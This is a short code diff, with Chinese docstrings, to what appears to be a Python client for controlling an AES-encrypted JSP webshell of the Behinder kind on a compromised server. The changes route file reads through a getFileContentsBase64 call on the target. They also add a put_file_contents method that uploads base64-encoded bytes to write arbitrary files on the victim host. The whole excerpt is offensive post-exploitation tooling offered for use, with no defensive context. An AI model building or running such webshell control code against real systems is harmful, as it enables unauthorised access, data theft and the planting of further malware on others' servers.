@@ -73,7 +73,7 @@ def md5_encode(s):
     return hashlib.md5(s).hexdigest()
 
 
-def base64_encode(s):
+def base64_encode(s: str | bytes):
     """将给定的字符串或字节序列编码成base64"""
     if isinstance(s, str):
         s = s.encode("utf-8")
@@ -225,12 +225,20 @@ class JSPWebshellBehinderAES:
     ) -> bytes:
         """获取文件的内容，内容是一个字节序列，不是已经解码的字符串"""
         content_b64 = await self.submit_code(
-            f"readFile({json.dumps(filepath)}, {max_size})"
+            f"getFileContentsBase64({json.dumps(filepath)}, {max_size})"
         )
         try:
             return base64.b64decode(content_b64)
         except Exception as exc:
             raise exceptions.TargetRuntimeError("base64解码失败") from exc
+
+    async def put_file_contents(self, filepath: str, content: bytes) -> bool:
+        """保存文件的内容，内容是一个字节序列，不是已经解码的字符串"""
+        await self.submit_code(
+            f"putFileContents({json.dumps(filepath)}, "
+            f"base64Decode({json.dumps(base64_encode(content))}))"
+        )
+        return True
 
     async def get_pwd(self) -> str:
         return await self.submit_code("getPwd()")
